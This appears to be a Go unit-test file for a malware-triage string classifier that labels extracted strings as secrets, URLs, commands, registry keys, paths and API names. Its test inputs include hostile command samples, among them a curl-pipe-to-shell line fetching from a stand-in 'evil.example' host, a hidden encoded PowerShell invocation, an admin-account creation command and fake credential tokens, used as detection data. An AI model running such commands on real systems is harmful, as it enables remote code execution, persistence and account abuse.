package strs

import (
	"strings"
	"testing"

	"github.com/q6r/teardown/internal/report"
)

// Fake but pattern-valid secrets used across the tests. None of them is a real credential. The tokens are
// written in pieces so that secret scanners do not mistake this test data for a leaked credential.
const (
	testAWSKey    = "AKIAIOSFODNN7EXAMPLE"
	testGitHubPAT = "ghp_" + "0123456789abcdefghijklmnopqrstuvwxyz"
	testSlack     = "xoxb-" + "123456789012-1234567890123-" + "AbCdEfGhIjKlMnOpQrStUvWx"
	testPEM       = "-----BEGIN RSA PRIVATE KEY-----"
	testJWT       = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
)

func testSecrets() []string {
	finePAT := "github_pat_" + strings.Repeat("A1b2C3d4E5", 8) + "xy"
	return []string{testAWSKey, testGitHubPAT, finePAT, testSlack, testJWT}
}

func TestClassify(t *testing.T) {
	tests := []struct {
		name     string
		in       string
		wantCat  string
		wantKind string
	}{
		// secrets
		{"aws key", testAWSKey, report.CatSecret, kindAWS},
		{"aws key in config", "aws_access_key_id=" + testAWSKey, report.CatSecret, kindAWS},
		{"aws temporary key", "ASIAIOSFODNN7EXAMPLE", report.CatSecret, kindAWS},
		{"github classic token", testGitHubPAT, report.CatSecret, kindGitHub},
		{"github fine-grained token", "github_pat_" + strings.Repeat("A1b2C3d4E5", 8) + "xy", report.CatSecret, kindGitHub},
		{"slack token", testSlack, report.CatSecret, kindSlack},
		{"pem rsa header", testPEM, report.CatSecret, kindPEM},
		{"pem openssh header", "-----BEGIN OPENSSH PRIVATE KEY-----", report.CatSecret, kindPEM},
		{"pem pgp header", "-----BEGIN PGP PRIVATE KEY BLOCK-----", report.CatSecret, kindPEM},
		{"jwt", testJWT, report.CatSecret, kindJWT},
		{"secret wins over url", "https://user:" + testGitHubPAT + "@github.com/x/y", report.CatSecret, kindGitHub},
		{"certificate header is not a private key", "-----BEGIN CERTIFICATE-----", report.CatPlain, ""},
		{"aws key one char short", "AKIAIOSFODNN7EXAMPL", report.CatPlain, ""},

		// urls
		{"http url", "http://example.com/path", report.CatURL, "http"},
		{"https url with query", "https://api.example.org/v1?x=1&y=2", report.CatURL, "https"},
		{"url inside a sentence", "Failed to fetch https://example.com/x: timeout", report.CatURL, "https"},
		{"ftp url", "ftp://user@host.example.net/file", report.CatURL, "ftp"},
		{"file url", "file:///etc/passwd", report.CatURL, "file"},
		{"jdbc style url", "jdbc:mysql://localhost:3306/db", report.CatURL, "mysql"},
		{"websocket url", "wss://stream.example.com/ws", report.CatURL, "wss"},
		{"url template", "http://%s:%d/status", report.CatURL, "http"},
		{"scheme alone", "http://", report.CatPlain, ""},
		{"unknown scheme", "xhttp://example.com", report.CatPlain, ""},
		{"command line with a url is a url", "curl -s http://evil.example/x.sh | sh", report.CatURL, "http"},

		// emails
		{"plain email", "admin@example.com", report.CatEmail, ""},
		{"email in text", "Contact: bob.smith+tag@mail.example.org for help", report.CatEmail, ""},
		{"scp style git address", "git@github.com:q6r/teardown.git", report.CatEmail, ""},
		{"no dot in domain", "user@localhost", report.CatPlain, ""},
		{"file extension is not a tld", "foo@bar.dll", report.CatPlain, ""},
		{"annotation", "@Override", report.CatPlain, ""},

		// ip addresses
		{"private ipv4", "192.168.1.1", report.CatIP, "ipv4"},
		{"ipv4 with port", "10.0.0.5:8080", report.CatIP, "ipv4"},
		{"ipv4 in a sentence", "Connecting to 8.8.8.8 now", report.CatIP, "ipv4"},
		{"loopback", "127.0.0.1", report.CatIP, "ipv4"},
		{"unspecified", "0.0.0.0", report.CatIP, "ipv4"},
		{"cidr", "10.0.0.0/8", report.CatIP, "ipv4"},
		{"assembly version N.N.0.0", "1.2.0.0", report.CatPlain, ""},
		{"assembly version 2.0.0.0", "2.0.0.0", report.CatPlain, ""},
		{"file version with big octet", "10.0.19041.1", report.CatPlain, ""},
		{"octet over 255", "256.1.1.1", report.CatPlain, ""},
		{"leading zeros", "01.02.03.04", report.CatPlain, ""},
		{"five parts", "1.2.3.4.5", report.CatPlain, ""},
		{"glued to a letter", "v1.2.3.4", report.CatPlain, ""},
		{"leading zero octet", "0.1.2.3", report.CatPlain, ""},
		{"ipv6 loopback is noise", "::1", report.CatPlain, ""},
		{"short link-local with zone is noise", "fe80::1%eth0", report.CatPlain, ""},
		{"bracketed loopback with port is noise", "[::1]:8080", report.CatPlain, ""},
		{"ipv6 documentation", "2001:db8::ff00:42:8329", report.CatIP, "ipv6"},
		{"ipv6 link-local with zone", "fe80::a1b2:c3d4:e5f6%eth0", report.CatIP, "ipv6"},
		{"ipv6 in brackets with port", "[2001:db8::1:2]:8080", report.CatIP, "ipv6"},
		{"ipv4 mapped ipv6", "::ffff:192.0.2.1", report.CatIP, "ipv4"},
		{"time of day", "12:34:56", report.CatPlain, ""},
		{"mac address", "00:11:22:33:44:55", report.CatPlain, ""},
		{"bare double colon", "::", report.CatPlain, ""},
		{"cpp scope", "std::string", report.CatPlain, ""},

		// registry
		{"hklm run key", `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`, report.CatRegistry, "hklm"},
		{"hklm short", `HKLM\SYSTEM\CurrentControlSet\Services`, report.CatRegistry, "hklm"},
		{"hkcu short", `HKCU\Software\Foo`, report.CatRegistry, "hkcu"},
		{"root name alone", "HKEY_CURRENT_USER", report.CatRegistry, "hkcu"},
		{"nt registry path", `\Registry\Machine\Software\X`, report.CatRegistry, "nt"},
		{"unrooted software key", `SOFTWARE\Microsoft\Windows NT\CurrentVersion`, report.CatRegistry, ""},
		{"registry key inside a command", `reg add HKLM\Software\Run /v x`, report.CatRegistry, "hklm"},
		{"single component software", `SOFTWARE\Foo`, report.CatPlain, ""},
		{"hk prefix inside a word", `XHKLM\Foo`, report.CatPlain, ""},

		// commands
		{"cmd /c", `cmd.exe /c whoami`, report.CatCommand, "cmd"},
		{"cmd with full path", `C:\Windows\System32\cmd.exe /c "net user"`, report.CatCommand, "cmd"},
		{"powershell encoded", `powershell -nop -w hidden -enc SQBFAFgA`, report.CatCommand, "powershell"},
		{"posix shell", `/bin/sh -c "echo hi"`, report.CatCommand, "shell"},
		{"curl without url", `curl -o out.bin`, report.CatCommand, "download"},
		{"certutil", `certutil -urlcache -f`, report.CatCommand, "lolbin"},
		{"net user", `net user admin secret /add`, report.CatCommand, "lolbin"},
		{"rm -rf", `rm -rf /tmp/x`, report.CatCommand, "shell"},
		{"chmod", `chmod +x payload`, report.CatCommand, "shell"},
		{"cue inside prose", `This tool runs cmd.exe /c internally`, report.CatCommand, "cmd"},
		{"net with unknown verb", `net work`, report.CatPlain, ""},
		{"cmd error message is prose", `CMD Internal Error %s`, report.CatPlain, ""},
		{"powershell sentence is prose", `PowerShell is not installed`, report.CatPlain, ""},
		{"shell sentence is prose", `sh is not recognized as a command`, report.CatPlain, ""},
		{"rundll32 with an entry point", `rundll32 shell32.dll,Control_RunDLL`, report.CatCommand, "lolbin"},
		{"rundll32 sentence is prose", `rundll32 failed to start`, report.CatPlain, ""},
		{"sudo with a verb", `sudo systemctl restart ssh`, report.CatCommand, "shell"},
		{"plain prose", `echo hello world`, report.CatPlain, ""},

		// user agents
		{"browser user agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", report.CatUserAgent, "browser"},
		{"curl agent", "curl/7.68.0", report.CatUserAgent, "tool"},
		{"go agent", "Go-http-client/1.1", report.CatUserAgent, "tool"},
		{"header line", "User-Agent: foo", report.CatUserAgent, "header"},
		{"token without version", "Mozilla/", report.CatPlain, ""},
		{"token glued to a word", "libcurl/7.1", report.CatPlain, ""},

		// paths
		{"windows path", `C:\Windows\System32\drivers\etc\hosts`, report.CatPath, "windows"},
		{"windows path with slashes", "C:/Users/x/file.txt", report.CatPath, "windows"},
		{"unc path", `\\server\share\file`, report.CatPath, "unc"},
		{"env var path", `%APPDATA%\Microsoft\x`, report.CatPath, "windows"},
		{"nt device path", `\Device\HarddiskVolume1\x`, report.CatPath, "windows"},
		{"relative windows root", `Windows\System32\cmd.exe`, report.CatPath, "windows"},
		{"path inside a sentence", `Cannot open C:\Users\foo\x.txt for reading`, report.CatPath, "windows"},
		{"unix path", "/usr/lib/libc.so.6", report.CatPath, "unix"},
		{"single known root", "/tmp", report.CatPath, "unix"},
		{"home relative", "~/.ssh/id_rsa", report.CatPath, "unix"},
		{"dot relative", "./configure", report.CatPath, "unix"},
		{"parent relative", "../../x", report.CatPath, "unix"},
		{"two component route", "/api/v1/users", report.CatPath, "unix"},
		{"bare slash", "/", report.CatPlain, ""},
		{"single unknown component", "/s", report.CatPlain, ""},
		{"line comment", "// comment here", report.CatPlain, ""},

		// domains
		{"domain", "example.com", report.CatDomain, "com"},
		{"subdomain", "sub.example.co", report.CatDomain, "co"},
		{"onion", "abcdefghijklmnop.onion", report.CatDomain, "onion"},
		{"upper case domain", "EXAMPLE.COM", report.CatDomain, "com"},
		{"hyphenated", "my-site.example.org", report.CatDomain, "org"},
		{"dotnet namespace", "Microsoft.NET", report.CatPlain, ""},
		{"dll name", "kernel32.dll", report.CatPlain, ""},
		{"markdown file", "readme.md", report.CatPlain, ""},
		{"shell script name", "foo.sh", report.CatPlain, ""},
		{"zip name", "archive.zip", report.CatPlain, ""},
		{"leading hyphen label", "-bad.example.com", report.CatPlain, ""},
		{"empty label", "ex..ample.com", report.CatPlain, ""},

		// api names
		{"injection api", "CreateRemoteThread", report.CatAPI, groupProcess},
		{"alloc api", "VirtualAllocEx", report.CatAPI, groupProcess},
		{"ansi variant", "CreateFileA", report.CatAPI, groupFile},
		{"wide variant", "CreateFileW", report.CatAPI, groupFile},
		{"registry api", "RegSetValueExW", report.CatAPI, groupRegistry},
		{"cng prefix", "BCryptEncrypt", report.CatAPI, groupCrypto},
		{"openssl prefix", "EVP_EncryptInit_ex", report.CatAPI, groupCrypto},
		{"winsock prefix", "WSAStartup", report.CatAPI, groupNetwork},
		{"curl prefix", "curl_easy_init", report.CatAPI, groupNetwork},
		{"macho decorated symbol", "_dlopen", report.CatAPI, groupLoader},
		{"anti debug", "IsDebuggerPresent", report.CatAPI, groupAntiDebug},
		{"ptrace", "ptrace", report.CatAPI, groupAntiDebug},
		{"native api", "NtCreateThreadEx", report.CatAPI, groupNative},
		{"algorithm name", "AES-256-CBC", report.CatAPI, groupCrypto},
		{"library name", "OpenSSL", report.CatAPI, groupCrypto},
		{"privilege name", "SeDebugPrivilege", report.CatAPI, groupPrivilege},
		{"word that only starts like an api", "Cryptography", report.CatPlain, ""},
		{"generic word", "Sleeping", report.CatPlain, ""},

		// encoded blobs
		{"base64 sentence", "SGVsbG8sIHdvcmxkISBUaGlzIGlzIGEgYmFzZTY0IGVuY29kZWQgc3RyaW5nLg==", report.CatBase64, ""},
		{"base64 alphabet", "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/", report.CatBase64, ""},
		{"long identifier without digits", "ThisIsAVeryLongIdentifierNameWithoutAnyDigitsOrSeparators", report.CatPlain, ""},
		{"snake case identifier with digits", "This_Is_A_Very_Long_Identifier_Name_With_Digits_1234_x", report.CatPlain, ""},
		{"md5 hex", "d41d8cd98f00b204e9800998ecf8427e", report.CatHex, ""},
		{"sha1 hex", "da39a3ee5e6b4b0d3255bfef95601890afd80709", report.CatHex, ""},
		{"letters only hex below 64", "deadbeefdeadbeefdeadbeefdeadbeef", report.CatPlain, ""},
		{"long digit run is hex", strings.Repeat("1234567890", 7), report.CatHex, ""},
		{"odd length hex", "d41d8cd98f00b204e9800998ecf8427e0", report.CatPlain, ""},

		// plain
		{"dos stub", "This program cannot be run in DOS mode.", report.CatPlain, ""},
		{"short identifier", ".text", report.CatPlain, ""},
		{"empty", "", report.CatPlain, ""},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			gotCat, gotKind := Classify(tc.in)
			if gotCat != tc.wantCat || gotKind != tc.wantKind {
				t.Fatalf("Classify(%q) = (%q, %q), want (%q, %q)", tc.in, gotCat, gotKind, tc.wantCat, tc.wantKind)
			}
		})
	}
}

func TestClassifyHandlesArbitraryBytes(t *testing.T) {
	inputs := []string{
		"\x00\x01\x02", "\xff\xfe\xfd", "é€😀 non-ascii text", strings.Repeat("\x00", 100),
		"://", "@", ".@.", "::", "[", "[]", "%", "%%", `\\`, `\`, `C:\`, "HKEY_", `HKLM\`,
		strings.Repeat("A", 5000), strings.Repeat("eyJ", 100), strings.Repeat("ghp_", 50),
	}
	for _, in := range inputs {
		cat, _ := Classify(in)
		if cat == "" {
			t.Errorf("Classify(%q) returned an empty category", in)
		}
	}
}

func TestCategoryTableIsComplete(t *testing.T) {
	seen := map[string]bool{}
	for i, name := range categoryNames {
		if name == "" {
			t.Fatalf("category %d has no name", i)
		}
		if seen[name] {
			t.Fatalf("duplicate category name %q", name)
		}
		seen[name] = true
	}
	for _, c := range report.StringCategories() {
		if !seen[c] {
			t.Errorf("report category %q is not produced by the classifier", c)
		}
	}
	if len(seen) != len(report.StringCategories()) {
		t.Errorf("classifier has %d categories, report lists %d", len(seen), len(report.StringCategories()))
	}
}

func TestTLDListHasNoDuplicatesOrExcludedEntries(t *testing.T) {
	seen := map[string]bool{}
	for _, f := range strings.Fields(tldList) {
		if seen[f] {
			t.Errorf("duplicate TLD %q", f)
		}
		seen[f] = true
	}
	for _, excluded := range strings.Fields("ai am app as cc cf cr in la md mk mm mp pl pm ps py rs sc sh so st zip mov dll exe bat sys") {
		if seen[excluded] {
			t.Errorf("TLD %q collides with a common file extension and must not be listed", excluded)
		}
	}
}
